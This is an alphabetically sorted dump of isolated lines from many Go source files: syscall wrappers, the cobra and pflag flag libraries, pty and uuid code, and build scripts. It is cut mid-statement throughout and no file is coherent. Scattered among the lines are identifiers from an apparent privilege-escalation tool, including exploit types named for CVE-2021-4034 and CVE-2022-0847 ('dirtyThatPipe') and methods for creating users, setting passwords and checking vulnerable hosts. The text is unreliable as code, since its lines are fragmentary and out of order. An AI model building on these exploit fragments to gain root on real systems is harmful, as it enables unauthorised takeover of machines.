const MAX_INTERFACE_NAME_LEN = 256
const PROCESS_NAME_NATIVE = 1
const RNDGETENTCNT = 0x80045200
const SIO_GET_INTERFACE_LIST = 0x4004747F
const SI_LOAD_SHIFT = 0x10
const SO_ORIGINAL_DST = 0x50
const SPEED_UNKNOWN = -0x1
const SYS___SYSCTL = SYS_SYSCTL
const SizeofClockinfo = 0x10
const SizeofClockinfo = 0x14
const SizeofInotifyEvent = 0x10
const SizeofKinfoProc = 0x288
const SizeofModuleEntry32 = unsafe.Sizeof(ModuleEntry32{})
const SizeofOpenHow = 0x18
const SizeofUvmexp = 0x158
const UNIX_PATH_MAX = 108 // defined in afunix.h
const _C__NSIG = 0x41
const _C__NSIG = 0x80
const _SYS_GETDIRENTRIES64 = 344
const _dragonflyABIChangeVersion = 500705
const _ino64First = 1200031
const char 
const cpuSetSize = _CPU_SETSIZE / _NCPUBITS
const defaultNumEntries = 100
const hdrSize = unsafe.Sizeof(fileHandle{})
const ioctlReadTermios = unix.TCGETS
const ioctlReadTermios = unix.TIOCGETA
const ioctlWriteTermios = unix.TCSETS
const ioctlWriteTermios = unix.TIOCSETA
const isBigEndian = false
const isBigEndian = true
const maxLineLength = 4096
const min = int(unsafe.Sizeof(SECURITY_DESCRIPTOR{}))
const n = _C_SPECNAMELEN 
const namoff = uint64(unsafe.Offsetof(Dirent{}.Name))
const noMatch = Errno(
const psize = int(unsafe.Sizeof(uintptr(0)))
const px_proto_oe = 0
const raceenabled = false
const raceenabled = true
const randPoolSize = 16 
const rlimInf32 = 
const rlimInf64 = 
const siz = unsafe.Sizeof(mib[0])
const socket_error = uintptr(
const struct mq_attr 
const struct sigevent 
const struct timespec 
const(
constants to an existing architecture/OS pair requires some manual effort
constants.
constraintOperators = map[string]constraintOperation{
constraintRegexp = regexp.MustCompile(fmt.Sprintf(
container := struct {
container)
context = (
continue
continue main
contributors may be used to endorse or promote products derived from
control
control  SECURITY_DESCRIPTOR_CONTROL
control)
convertSecurityDescriptorToStringSecurityDescriptor(sd 
cookie
cookie := (
cookie interface{}
cookies map[
cookies: make(map[
cop := constraintOperators[matches[1]]
copies or substantial portions of the Software.
copy((
copy(t.line[t.pos
core    = 0x80
core  = 0x80
core != 0 }
count
count = (
count = 0
countValue {
countValue) Set(s string) error {
countValue) String() string { return strconv.Itoa(int(
countValue) Type() string {
countValue)(p)
cpuBitsMask(cpu) != 0
cpuset)
create' is called.  Every command will automatically have the '--help' flag added.
createInt := 0
createInt = 1
createUser := fmt.Sprintf(
createmode = CREATE_ALWAYS
createmode = CREATE_NEW
createmode = OPEN_ALWAYS
createmode = OPEN_EXISTING
createmode = TRUNCATE_EXISTING
creates Go type aliases to the corresponding C types. The file is then fed
creationData := fmt.Sprintf(
crlf       = []byte{'
cross darwin    amd64 arm64
cross dragonfly amd64
cross freebsd   amd64 386 arm arm64
cross linux     amd64 386 arm arm64 ppc64 ppc64le s390x mips mipsle mips64 mips64le
cross netbsd    amd64 386 arm arm64
cross openbsd   amd64 386 arm arm64
cross solaris   amd64
cross windows amd64 386 arm
cross() {
cs := len(c.segments)
csStr[i] = c.String()
csvReader := csv.NewReader(stringReader)
ctlname string
ctloid  []_C_int
ctx := context.Background()
ctx context.Context
currEstab         uint32
cve20214034Exploit {
cve20214034Exploit{
cve20220847Exploit {
cve20220847Exploit) dirtyThatPipe() (r 
cve20220847Exploit{
d := 
d = durationValue(v)
d = nullDir }
d = unsafe.Pointer(
d to get the actual data
d.Length = int64(n)
d.dll))) != nil {
d.mu.Lock()
d.mustLoad()
dVipa         [16]byte
dVipaFamily   byte
dVipaPfx      uint16
dVipaPort     uint16
d[0][j] = j
d[i][0] = i
d[i][j] = d[i-1][j-1]
d[i][j] = min 
dacl  
dacl     
dacl = (
daclDefaulted = _p1 != 0
daclDefaulted {
daclPresent = _p0 != 0
daclPresent {
dansouza
darwin 
darwin_amd64)
darwin_arm64)
data     
data := 
data := (
data = data[SizeofPtr:]
data = data[n:]
data unsafe.Pointer
data)
data))
data)))
data.PathBuffer[0]))
data.compatIDsLength]
data.size = data.unsafeSizeOf()
data.size = reqSize
data.size = uint32(unsafe.Sizeof(
data1)
data[0] {
data[0])
data[0])))
data[cap(data)-1]
datalen := len(fds) 
datap = 
datasiz := len(data)
debugflags = func(x 
debugflags(c)
debugflags(y)
debugging) for details.
declare -A errors
default:
default: all
default: build
defaultUsage(f)
defaulted)
defer Chdir(wd)
defer Close(fd)
defer Close(h)
defer CloseHandle(fd)
defer CloseHandle(s)
defer CloseHandle(snapshot)
defer CoTaskMemFree(unsafe.Pointer(p))
defer DestroyEnvironmentBlock(block)
defer LocalFree((Handle)(unsafe.Pointer(s)))
defer LocalFree((Handle)(unsafe.Pointer(sid)))
defer LocalFree(Handle(unsafe.Pointer(argv)))
defer LocalFree(Handle(unsafe.Pointer(sddl)))
defer LocalFree(Handle(unsafe.Pointer(winHeapACL)))
defer LocalFree(Handle(unsafe.Pointer(winHeapSD)))
defer cancel()
defer closedir(d)
defer d.mu.Unlock()
defer e.mu.Unlock()
defer f.Close()
defer flagCompletionMutex.RUnlock()
defer flagCompletionMutex.Unlock()
defer formattingLock.RUnlock()
defer formattingLock.Unlock()
defer func() {
defer func() { _ = ptmx.Close() }() // Best effort.
defer func() { _ = tty.Close() }() // Best effort.
defer l.mu.Unlock()
defer m.Unlock()
defer nodeMu.Unlock()
defer outFile.Close()
defer p.Close()
defer p.mu.Unlock()
defer poolMu.Unlock()
defer resp.Body.Close()
defer respStart.Body.Close()
defer syscall.CloseHandle(snapshot)
defer syscall.CloseHandle(syscall.Handle(snapshot))
defer t.lock.Unlock()
defer tarWriter.Close()
defer timeMu.Unlock()
defer waitResp.Body.Close()
define
define AF_LOCAL AF_UNIX
define CAA(x)               8(x)
define EDCHPXV(x)        1016(x)       // in the CAA
define EMUL_ENABLED
define EMUL_NATIVE
define FS_KEY_DESC_PREFIX_SIZE         8
define FS_MAX_KEY_SIZE                 64
define GOSYM_PREFIX _STRINGIFY_(__USER_LABEL_PREFIX__)
define GTAB64(x)           80(x)
define IFT_CARP
define INVOKE_SYSCALL
define IPPROTO_L2TP
define IPV6_FAITH
define IPV6_OPTIONS
define IPV6_RTHDR_STRICT
define IPV6_SOCKOPT_RESERVED1
define KERNEL 1
define LCA64(x)            88(x)
define LE_CALL BYTE $0x0D
define MSG_FASTOPEN    0x20000000
define PSALAA            1208(R0)
define PTRACE_GETREGS
define PTRACE_SETREGS
define SAVSTACK_ASYNC(x)  336(x)       // in the LCA
define SIOCAIFADDR
define SIOCGIFGENERIC
define SIOCSIFGENERIC
define SIOCSIFPHYADDR
define SOL_NETLINK
define SS_ERRNO(x)         16(x)
define SS_ERRNOJR(x)       20(x)
define SS_GO(x)             8(x)
define SS_LE(x)             0(x)
define TIOCREMOTE 0x80047469
define TIPC_WAIT_FOREVER 0xffffffff
define WALTSIG
define _DARWIN_C_SOURCE
define _DARWIN_USE_64_BIT_INODE
define _FILE_OFFSET_BITS 64
define _GNU_SOURCE
define _HIDIOCGRAWNAME
define _HIDIOCGRAWNAME_LEN
define _HIDIOCGRAWPHYS
define _HIDIOCGRAWPHYS_LEN
define _HIDIOCGRAWUNIQ
define _HIDIOCGRAWUNIQ_LEN
define _LARGEFILE64_SOURCE
define _LARGEFILE_SOURCE
define _STRINGIFY2_(x) 
define _STRINGIFY_(x) _STRINGIFY2_(x)
define __APPLE_USE_RFC_3542
define a variable outside with the correct scope to assign the flag to
define c_select select
define nelem(x) (sizeof(x)/sizeof((x)[0]))
define of PX_PROTO_OE in
define schedppq 1
define that can get the real ones.
define${SP}
defined constant
defined to get the
defines
deleteProcThreadAttributeList(al.data)
departed)
deploy:
deprecated
desc := filepath.Base(command)
desc string
description   [LINE_LEN]uint16
desc} -gt $maxdesclength ]
destXCF       [16]byte
destXCFFamily byte
destXCFPfx    uint16
dest[0]
dest[0])
dest[idx])
destp = 
destsiz -= s
destsiz := len(dest)
destsiz = 0
destsize := len(dest)
details for your users.
dev 
dev := (uint64(major) 
dev := (uint64(major) << 8) 
develop a Cobra-based application. It is the easiest way to incorporate Cobra into your application.
didResize := false
didResize = true
different than a double dash. Single dashes signify a series of shorthand
dir = uintptr(r0)
directive = ShellCompDirectiveDefault
directive = ShellCompDirectiveNoFileComp
directive = ShellCompDirectiveNoSpace
directory) where a recipient would be likely to look for such a notice.
disableFormatting = false
disableFormatting = true
distribution.
dll 
dn := uint32(50)
doCompleteFlags := func(flag 
doCompleteFlags(flag)
doCompleteRequiredFlags := func(flag 
doCompleteRequiredFlags(flag)
docker build -t creack-pty-test -f Dockerfile.golang --build-arg=GOVERSION=1.14 --build-arg=GOOS=darwin --build-arg=GOARCH=386 .
docker build -t creack-pty-test -f Dockerfile.golang --build-arg=GOVERSION=1.14 --build-arg=GOOS=darwin --build-arg=GOARCH=arm .
docker build -t creack-pty-test -f Dockerfile.golang --build-arg=GOVERSION=1.6 --build-arg=GOOS=linux --build-arg=GOARCH=amd64 .
docker build -t creack-pty-test -f Dockerfile.riscv .
docker.sock
dockerfile := 
done
done > 0 {
done))
done:
down := 0
down = y - t.cursorY
dragonfly
dragonfly_amd64)
driveType = uint32(r0)
driverPath               [MAX_PATH]uint16
drivesBitMask = uint32(r0)
drvDescription  [LINE_LEN]uint16
dsa := [18]uint64{0}
dsa = [18]uint64{0}
dsa[0])
dst))
dst.CreationTime = src.CreationTime
dst.FileAttributes = src.FileAttributes
dst.FileSizeHigh = src.FileSizeHigh
dst.FileSizeLow = src.FileSizeLow
dst.LastAccessTime = src.LastAccessTime
dst.LastWriteTime = src.LastWriteTime
dst.Reserved0 = src.Reserved0
dst.Reserved1 = src.Reserved1
dstDirent))[:])
dstDirent.Fileno = uint64(srcDirent.Fileno)
dstDirent.Namlen = uint16(srcDirent.Namlen)
dstDirent.Off = 0
dstDirent.Pad0 = 0
dstDirent.Pad1 = 0
dstDirent.Reclen = uint16(reclen)
dstDirent.Type = srcDirent.Type
dstPos 
dstPos := 0
dst[0]))
dst[13] = '-'
dst[18] = '-'
dst[23] = '-'
dst[8] = '-'
dsv := new(durationSliceValue)
dsv.value = p
dsv.value = val
dsymonds
dummy
dup(int fd)
dupContext = (
dupacks           uint32
durationSliceValue {
durationSliceValue) Append(val string) error {
durationSliceValue) GetSlice() []string {
durationSliceValue) Replace(val []string) error {
durationSliceValue) Set(val string) error {
durationSliceValue) String() string {
durationSliceValue) Type() string {
durationSliceValue) toString(val time.Duration) string {
durationValue {
durationValue) Set(s string) error {
durationValue) String() string { return (
durationValue) Type() string {
durationValue)(p)
durationValue:
dwFlags             uint32
dwSize              uint32
e := 
e := CreatePipe(
e := GetComputerName(
e := d.Load()
e := p.Find()
e := p.l.Load()
e = SetEndOfFile(fd)
e = errors[i]
e = errors[i].num
e = signals[i]
e = signals[i].num
e.cookies[
e.epfd2ep[epfd] = 
e.fds = nil
e.fds[fd] = fCookie
e.mu.Lock()
e.mu.Lock() // in [rare] case of concurrent epollcreate 
e.mu.Unlock()
e.nextEpfd
e.paths = nil
e.paths[path] = fCookie
e.peIntToExt(
e1 = syscall.GetErrno()
each GOOS/GOARCH pair.
eadd = (
echo
echo '
echo ')'
echo '/
echo '// Code generated by the command above
echo '// Errors'
echo '// Signals'
echo 'const ('
echo 'usage: mkall.sh [-n]' 1>
echo -E '
echo 1>
echo bool
echo is for echoing anything back.
echo package plan9
echo package unix
echo things multiple times back to the user by providing
echo2() {
edir[0])
effectiveGID := syscall.Getegid()
effectiveUID := syscall.Geteuid()
egid = int(r0)
egrep -v '(SIGSTKSIZE
elif
elif [[ $last_vtype == syscall.Errno 
elif [[ $line =
elif [[ $vtype == 
else
embeds the usage as part of its output.
emptyFiodgnameArg fiodgnameArg
en-us
enabling-shell-autocompletion))
end() {
endif
entersyscall(SB)
entity (including a cross-claim or counterclaim in a lawsuit) alleging
entries []string
entry          
entry := UTF16PtrToString((
entry)
entry.AllHosts = true
entry.BinaryName = path.Base(commandParts[0])
entry.Command = strings.TrimSpace(parts[len(parts)-1])
entry.Hostname = strings.TrimSpace(bracketedParts[1])
entry.HostnameMatches = entry.AllHosts 
entry.NoPasswd = true
entry.UserName = strings.TrimSpace(bracketedParts[0])
entryp)
env:
envp)
envs           []string
envs = (
envv)
ep.fds[fd] = event
epfd = e.nextEpfd
epfd2ep  map[int]
epfd2ep:  make(map[int]
ephemExhaust      uint32
ephemHiWater      uint16
ephemInUse        uint16
epoch      = unix - lillian   // Days between epochs
epollEvts 
equal            operator = '='
er2 = int(uer2)
err      error
err  error
err := CapRightsSet(
err := Close(e.port)
err := Gettimeofday(
err := LoadConnectEx()
err := c.Flags().Parse(args)
err := coCreateGuid(
err := flag.Value.Set(value)
err := getcwd(b)
err := loadWSASendRecvMsg()
err := nu.UUID.Scan(value)
err := pipe2(
err := w.Write(vals)
err = CreateEnvironmentBlock(
err = EIO
err = ERANGE //return ERANGE if no match is found in this batch
err = ERESTART
err = ERROR_INVALID_PARAMETER
err = ERROR_OBJECT_NOT_FOUND
err = ErrHelp
err = ErrPasteIndicator
err = Gettimeofday(
err = Uname(
err = c.ParseFlags(a)
err = cmd.execute(flags)
err = e
err = e1
err = er
err = errno
err = errnoErr(Errno(e))
err = errnoErr(e)
err = errnoErr(e1)
err = error(e1)
err = getcwd(buf)
err = gettimeofday(
err = nil
err = pipe(
err = procIsWow64Process2.Find()
err = procQueryServiceDynamicInformation.Find()
err = procUnsubscribeServiceChangeNotifications.Find()
err = syscall.EINVAL
err = syscall.ErrorString(e)
err = tryGetmntent1024(stat)
err = tryGetmntent128(stat)
err = tryGetmntent256(stat)
err = tryGetmntent512(stat)
err = tryGetmntent64(stat)
err = uuid.UnmarshalBinary(b)
errChan <- err
errChan <- nil
errEAGAIN error = syscall.EAGAIN
errEINVAL error = syscall.EINVAL
errENOENT error = syscall.ENOENT
errERROR_EINVAL     error = syscall.EINVAL
errERROR_IO_PENDING error = syscall.Errno(errnoERROR_IO_PENDING)
errWriter io.Writer
errcode = syscall.Errno(r0)
errno := gettimeofday(
errno := gettimeofday(tv)
errno = 0
errnoERROR_IO_PENDING = 997
error
error:
errorHandling     ErrorHandling
errors=$(
esac
estabResets       uint32
euid = int(r0)
event = uint32(r0)
event = unsafe.Pointer(
eventPoll
eventPoll) getFds() []int {
eventPoll{
events[0])
exclusive options such as specifying an output format as either 
exec.Cmd) (
exec.Cmd{
execpromises)
execve(const char 
exit
exit 0
exit 1
exit 2
exit(SB)
exit(int rval)
exitThread(code int) (err error) = SYS_EXIT
exited  = 0
exited  = 0x00
exitsyscall(SB)
exp := 
exp.client = 
expChan := make(chan error)
expChan <- err
expChan <- nil
explicitEntries[0]
exploit {
exploit) createUser(log logger.Logger) (
exploit) isVulnerableDebian(s 
exploit) isVulnerableOther() bool {
exploit) setPassword(u 
exploit) timeDbusCommand(args []string) time.Duration {
exploitLogger := baseLog.WithTitle(exploit.Name)
exploit{}
export HELM_ACTIVE_HELP=local
export LC_ALL=C
export LC_CTYPE=C
export PATH=/usr/gnu/bin:$PATH
expr = unsafe.Pointer(exptr)
ext2
extattr_delete_file(const char 
extattr_delete_link(const char 
extattr_get_file(const char 
extattr_get_link(const char 
extattr_list_file(const char 
extattr_list_link(const char 
extattr_set_file(const char 
extattr_set_link(const char 
extattrctl(const char 
extension
f        constraintFunc
f  constraintFunc
f := 
f := c.Flags().Lookup(v)
f := fs.Lookup(fname)
f = float32Value(v)
f = float64Value(v)
f.AddFlag(flag)
f.AddFlag(newflag)
f.AddGoFlag(goflag)
f.BoolSliceVarP(
f.DefValue
f.DurationSliceVarP(
f.Float32SliceVarP(
f.Float64SliceVarP(
f.IPSliceVarP(
f.Int32SliceVarP(
f.Int64SliceVarP(
f.IntSliceVarP(
f.PrintDefaults()
f.Shorthand
f.StringArrayVarP(
f.StringSliceVarP(
f.StringToInt64VarP(
f.StringToIntVarP(
f.StringToStringVarP(
f.UintSliceVarP(
f.Usage()
f.VisitAll(func(flag 
f.Write([]byte{4}) // EOT
f.actual = make(map[NormalizedName]
f.actual[nname] = flag
f.actual[normalName] = flag
f.addedGoFlagSets = make([]
f.argsLenAtDash = -1
f.argsLenAtDash = len(f.args)
f.errorHandling = errorHandling
f.failf(err.Error())
f.formal = make(map[NormalizedName]
f.formal[nname] = flag
f.formal[normalizedFlagName] = flag
f.interspersed = interspersed
f.name = name
f.normalizeNameFunc = n
f.output = output
f.parsed = true
f.shorthands = make(map[byte]
f.shorthands[c] = flag
f.sortedActual = sortFlags(f.actual)
f.sortedFormal = f.sortedFormal[:0]
f.sortedFormal = sortFlags(f.formal)
f.usage()
f=sysdeps/unix/sysv/linux/faccessat.c
fCookie := 
fCookie := e.fds[fd]
fCookie := e.paths[path]
fCookie.cookie
fCookie.cookie)
fCookie.cookie)))
fCookie.cookie] = fCookie
f[nf] = buf[p:]
f[nf] = buf[p:i]
fa := fiodgnameArg{Name: (
fa)))
fallthrough // (do the same as below)
fashion as described above using environment variables.  You may wish to document this in more
fchdir(int fd)
fchroot(int fd)
fcntl64Syscall = SYS_FCNTL64
fcntl_cmd = F_SETLK
fcntl_cmd = F_SETLKW
fcntlrightsp)
fd = int(r0)
fd[0] = int(fdx[0])
fd[1] = int(fdx[1])
fdatasync(int fd)
fdp)
fds   map[uintptr]
fds map[int]
fds.Bits[fd/NFDBITS] 
fds.Bits[i] = 0
fds:     make(map[uintptr]
fds: make(map[int]
fds[0])
fds[j] = int(
fdx)
ffcount)
fg    string
fh := (
fh.Bytes = size - uint32(unsafe.Sizeof(fileHandle{}))
fh.Bytes = uint32(len(handle))
fh.Type = handleType
fh.fileHandle.Type)) 
fh_size)
fhp)
fhstat(const void 
fields := strings.Fields(string(out))
fields := strings.Fields(string(output))
file (if it is not already there) and add in a type alias line. Note that if
file)
fileHandle
fileHandle)(unsafe.Pointer(
fileObj
fileObj)(unsafe.Pointer(uintptr(peInt.Object)))
fileObjCookie
files on an installation with unmodified header files. It is also important to
filesys_info [1024]W_Mntent
filesys_info [128]W_Mntent
filesys_info [256]W_Mntent
filesys_info [512]W_Mntent
filesys_info [64]W_Mntent
filter __%[1]s_escapeStringWithSpecialChars {
filter nwmFilter
filter[0])
finalArgs = finalCmd.Flags().Args()
finalCmd.InheritedFlags().VisitAll(func(flag 
finalCmd.NonInheritedFlags().VisitAll(func(flag 
finalCmd.ctx = c.ctx
finalCmd.enforceFlagGroupsForCompletion()
findFirstFile1(name 
finwait2Drops     uint32
first := args[0]
firstAccessEntry = 
firstAuditEntry = 
firstExplicitEntry = 
fish
fish := 
fish.Flags().BoolVar(
fish:
fixStatTimFields(stat)
fixStatTimFields(statptr)
fixedSize
fixedSize    = int(unsafe.Offsetof(Dirent{}.Name))
fixedSize < len(buf) 
fixwd()
flag
flag 
flag := 
flag := c.Flag(flagName)
flag := c.Flags().Lookup(fName)
flag := f.Lookup(name)
flag := fs.Lookup(name)
flag := fs.ShorthandLookup(name[:1])
flag = c.Flags().Lookup(name)
flag = c.PersistentFlags().Lookup(name)
flag = c.parentsPflags.Lookup(name)
flag = c.persistentFlag(name)
flag = nil
flag set.
flag.Annotations = map[string][]string{}
flag.Annotations[key] = values
flag.BoolVarP(
flag.Changed = true
flag.CommandLine.AddGoFlagSet(goflag.CommandLine)
flag.Deprecated = usageMessage
flag.Flag
flag.Flag to the pflag.FlagSet
flag.Flag) {
flag.Flag.Name was a single character (ex: 
flag.FlagSet
flag.FlagSet to the pflag.FlagSet
flag.FlagSet {
flag.FlagSet) bool {
flag.Hidden = true
flag.IntVar(
flag.Name = string(nname)
flag.Name = string(normalizedFlagName)
flag.Parse()
flag.Shorthand = flag.Name
flag.ShorthandDeprecated = usageMessage
flag.Var(
flag.VarP(
flag01            byte
flag02            byte
flagCompError)
flagCompError) Error() string {
flagCompletion := true
flagCompletion = false
flagCompletionFunctions[flag] = f
flagCompletionMutex.Lock()
flagCompletionMutex.RLock()
flagCompletionMutex.RUnlock()
flagErrorBuf 
flagErrorFunc func(
flagName 
flagName   string
flagName = lastArg[2:index]
flagName = lastArg[index-1 : index]
flagName = prevArg[2:]
flagName = prevArg[len(prevArg)-1:]
flagSet := cmd.Flags()
flagType string
flagValueWrapper) Set(s string) error {
flagValueWrapper) String() string {
flagValueWrapper) Type() string {
flagValueWrapper{
flagWithEqual := false
flagWithEqual = true
flagnameAndStatus := data[flagList]
flags 
flags             byte
flags         uint32
flags := []string{}
flags := c.Flags()
flags := cmd.NonInheritedFlags()
flags = LOAD_LIBRARY_SEARCH_SYSTEM32
flags = f.orderedActual
flags = f.orderedFormal
flags = f.sortedActual
flags = f.sortedFormal
flags can be interspersed with arguments anywhere on the command line
flags)
flags.PrintDefaults()
flags.SortFlags = false
flags.VisitAll(func(flag 
flags.VisitAll(func(pflag 
float32 {
float32) 
float32SliceValue {
float32SliceValue) Append(val string) error {
float32SliceValue) GetSlice() []string {
float32SliceValue) Replace(val []string) error {
float32SliceValue) Set(val string) error {
float32SliceValue) String() string {
float32SliceValue) Type() string {
float32SliceValue) toString(val float32) string {
float32Value {
float32Value) Set(s string) error {
float32Value) String() string { return strconv.FormatFloat(float64(
float32Value) Type() string {
float32Value)(p)
float64 {
float64) 
float64SliceValue {
float64SliceValue) Append(val string) error {
float64SliceValue) GetSlice() []string {
float64SliceValue) Replace(val []string) error {
float64SliceValue) Set(val string) error {
float64SliceValue) String() string {
float64SliceValue) Type() string {
float64SliceValue) toString(val float64) string {
float64Value {
float64Value) Set(s string) error {
float64Value) String() string { return strconv.FormatFloat(float64(
float64Value) Type() string {
float64Value)(p)
float64Value:
flock := Flock_t{
flock)
flock)))
flock[0]))
flock[0])) = lk.Type
flock[12]))
flock[12])) = lk.Len
flock[20]))
flock[20])) = lk.Pid
flock[2]))
flock[2])) = lk.Whence
flock[4]))
flock[4])) = lk.Start
flock_type = F_RDLCK
flock_type = F_UNLCK
flock_type = F_WRLCK
fmode = (st.Mode >> 3) 
fmode = (st.Mode >> 6) 
fmode = st.Mode 
fmt.Fprintf(
fmt.Println(
fmt.Println(err)
fmt.Println(exploit.Name)
fmt.Println(hex.EncodeToString(b))
fmt.Scanln()
fmt.Sprintf(
fmt:
fmtParts[i] = str
fn(c.Parent())
fn(flag)
fnptr
fobj   
fobj := new(fileObj)
fobj.Atim.Nsec = s.Atim.Nsec
fobj.Atim.Sec = s.Atim.Sec
fobj.Ctim.Nsec = s.Ctim.Nsec
fobj.Ctim.Sec = s.Ctim.Sec
fobj.Mtim.Nsec = s.Mtim.Nsec
fobj.Mtim.Sec = s.Mtim.Sec
fobj.Name = (
fobj.cookie == cookie {
for 
for !lineOk {
for a given GOOS/GOARCH pair must be generated on a system with that OS and
for b[i] != 0 {
for buf[i] != 0 {
for command-line options. See
for delayTime := avgTime / 4
for dstPos
for err == ERESTART {
for fd := range ep.fds {
for flag := range flagCompletionFunctions {
for i
for i := 0
for i := 1
for i := 14
for i := len(newLine)
for i := len(segments)
for i := range a {
for i := range args {
for i := range b {
for i := range d {
for i := range fds.Bits {
for i := range ifr.raw.Ifru {
for i := range name {
for i := range node.Name {
for i := range oldBuf {
for i := range padding {
for i := range s {
for i := range uuid {
for i := range value.Info {
for i := t.pos
for i := uint32(0)
for i = 0
for i in $errors
for i in $signals
for i in zsyscall
for j := 1
for j := i 
for j := range d[0] {
for j := uint32(0)
for k := range constraintOperators {
for k := range flags {
for k := range m {
for key := range flag.Annotations {
for len := uint64(4096)
for len(args) > 0 {
for len(buf) > 0 {
for len(data) > SizeofPtr {
for len(line) != 0 {
for len(out) > 0 {
for len(shorthands) > 0 {
for max != 0 
for n < int(pp.Len) 
for n < len(pp.Path) 
for p := c
for passn := 0
for pos < len(t.line) {
for pos > 0 {
for ptr := unsafe.Pointer(p)
for range ch {
for read < size {
for str[i] != 0 {
for t.cursorY < numPrevLines {
for t.cursorY > 0 {
for the old system). This program takes in a list of header files containing the
for val >= 10 {
for written < size {
for {
for(i=0
fork(void)
formal            map[NormalizedName]
format 
formattingLock.Lock()
formattingLock.RLock()
found = true
foundLocalNonPersistentFlag := false
foundLocalNonPersistentFlag = true
fprog))
freebsd
freebsd_386)
freebsd_amd64)
freebsd_arm)
freebsd_arm64)
from := 0
from = i 
from source checkouts of the kernel and various system libraries. This means
fromlenaddr)
fsfd = int(r0)
fsinfo [64]W_Mntent
fstype 
fstype = fstype[:8]
fsync(int fd)
ft.HighDateTime = uint32(nsec >> 32 
ft.LowDateTime = uint32(nsec 
fully POSIX-compliant flags as well as the Go [flag package](https://golang.org/pkg/flag/).
func (
func (absoluteSD 
func (addr 
func (al 
func (b 
func (bytesBase64 
func (bytesBase64 bytesBase64Value) String() string {
func (bytesHex 
func (bytesHex bytesHexValue) String() string {
func (c 
func (c commandSorterByName) Len() int           { return len(c) }
func (cmsg 
func (cs Constraints) Check(v 
func (cs Constraints) Equals(c Constraints) bool {
func (cs Constraints) Len() int {
func (cs Constraints) String() string {
func (d 
func (d Domain) String() string {
func (d ShellCompDirective) string() string {
func (data 
func (deviceInfoSet DevInfo) BuildDriverInfoList(deviceInfoData 
func (deviceInfoSet DevInfo) CancelDriverInfoSearch() error {
func (deviceInfoSet DevInfo) ClassInstallParams(deviceInfoData 
func (deviceInfoSet DevInfo) Close() error {
func (deviceInfoSet DevInfo) DestroyDriverInfoList(deviceInfoData 
func (deviceInfoSet DevInfo) DeviceInfoListDetail() (
func (deviceInfoSet DevInfo) DeviceInstallParams(deviceInfoData 
func (deviceInfoSet DevInfo) DeviceInstanceID(deviceInfoData 
func (deviceInfoSet DevInfo) DeviceRegistryProperty(deviceInfoData 
func (deviceInfoSet DevInfo) DriverInfoDetail(deviceInfoData 
func (deviceInfoSet DevInfo) EnumDeviceInfo(memberIndex int) (
func (deviceInfoSet DevInfo) EnumDriverInfo(deviceInfoData 
func (deviceInfoSet DevInfo) OpenDevRegKey(DeviceInfoData 
func (deviceInfoSet DevInfo) SelectedDevice() (
func (deviceInfoSet DevInfo) SelectedDriver(deviceInfoData 
func (deviceInfoSet DevInfo) SetClassInstallParams(deviceInfoData 
func (deviceInfoSet DevInfo) SetDeviceInstallParams(deviceInfoData 
func (deviceInfoSet DevInfo) SetDeviceRegistryProperty(deviceInfoData 
func (deviceInfoSet DevInfo) SetDeviceRegistryPropertyString(deviceInfoData 
func (deviceInfoSet DevInfo) SetSelectedDevice(deviceInfoData 
func (deviceInfoSet DevInfo) SetSelectedDriver(deviceInfoData 
func (e 
func (ep 
func (err invalidLengthError) Error() string {
func (f 
func (fds 
func (fh 
func (ft 
func (g 
func (guid GUID) String() string {
func (h 
func (i 
func (ifr 
func (ifr Ifreq) withData(p unsafe.Pointer) ifreqData {
func (iov 
func (ipnet 
func (ipnet ipNetValue) String() string {
func (l 
func (logger Logger) Silenced() Logger {
func (logger Logger) WithTitle(title string) Logger {
func (m 
func (msghdr 
func (n Note) Signal() {}
func (n Note) String() string {
func (nu 
func (p 
func (params 
func (pasteIndicatorError) Error() string {
func (r 
func (ret CONFIGRET) Error() string {
func (ret CONFIGRET) Unwrap() error {
func (ret CONFIGRET) Win32Error(defaultError Errno) Errno {
func (rsa 
func (s 
func (s NTStatus) Errno() syscall.Errno {
func (s NTStatus) Error() string {
func (s Signal) Signal() {}
func (s Signal) String() string {
func (s errString) Error() string { return string(s) }
func (sa 
func (sd 
func (selfRelativeSD 
func (sid 
func (t 
func (t Token) Close() error {
func (t Token) GetTokenGroups() (
func (t Token) GetTokenPrimaryGroup() (
func (t Token) GetTokenUser() (
func (t Token) IsMember(sid 
func (t Token) KnownFolderPath(folderID 
func (tml 
func (token Token) IsElevated() bool {
func (ts 
func (tv 
func (uuid 
func (uuid UUID) ClockSequence() int {
func (uuid UUID) Domain() Domain {
func (uuid UUID) ID() uint32 {
func (uuid UUID) NodeID() []byte {
func (uuid UUID) String() string {
func (uuid UUID) Time() Time {
func (uuid UUID) URN() string {
func (uuid UUID) Variant() Variant {
func (uuid UUID) Version() Version {
func (v 
func (v Collection) Len() int {
func (v Variant) String() string {
func (v Version) String() string {
func (w WaitStatus) Continued() bool { return false }
func (w WaitStatus) Continued() bool { return w
func (w WaitStatus) Continued() bool { return w == 0xFFFF }
func (w WaitStatus) CoreDump() bool { return false }
func (w WaitStatus) CoreDump() bool { return w
func (w WaitStatus) CoreDump() bool { return w.Signaled() 
func (w WaitStatus) ExitStatus() int {
func (w WaitStatus) ExitStatus() int { return int(w.ExitCode) }
func (w WaitStatus) Exited() bool { return true }
func (w WaitStatus) Exited() bool { return w
func (w WaitStatus) Killed() bool { return w
func (w WaitStatus) Signal() Signal {
func (w WaitStatus) Signal() Signal { return -1 }
func (w WaitStatus) Signal() syscall.Signal {
func (w WaitStatus) Signaled() bool { return false }
func (w WaitStatus) Signaled() bool { return w
func (w WaitStatus) StopSignal() Signal {
func (w WaitStatus) StopSignal() Signal { return -1 }
func (w WaitStatus) StopSignal() syscall.Signal {
func (w WaitStatus) Stopped() bool { return false }
func (w WaitStatus) Stopped() bool { return w
func (w WaitStatus) TrapCause() int {
func (w WaitStatus) TrapCause() int { return -1 }
func (w Waitmsg) ExitStatus() int {
func (w Waitmsg) Exited() bool   { return true }
func (w Waitmsg) Signaled() bool { return false }
func Acct(path string) (err error) {
func AddTemplateFuncs(tmplFuncs template.FuncMap) {
func Adjtime(delta 
func Adjtimex(buf 
func AllocateAndInitializeSid(identAuth 
func ArbitraryArgs(cmd 
func Arg(i int) string {
func Args() []string { return CommandLine.args }
func Await(w 
func BoolSliceVar(p 
func BoolSliceVarP(p 
func BoolVar(p 
func BoolVarP(p 
func BuildSecurityDescriptor(owner 
func BytePtrFromString(s string) (
func BytePtrToString(p 
func ByteSliceToString(s []byte) string {
func BytesBase64Var(p 
func BytesBase64VarP(p 
func BytesHexVar(p 
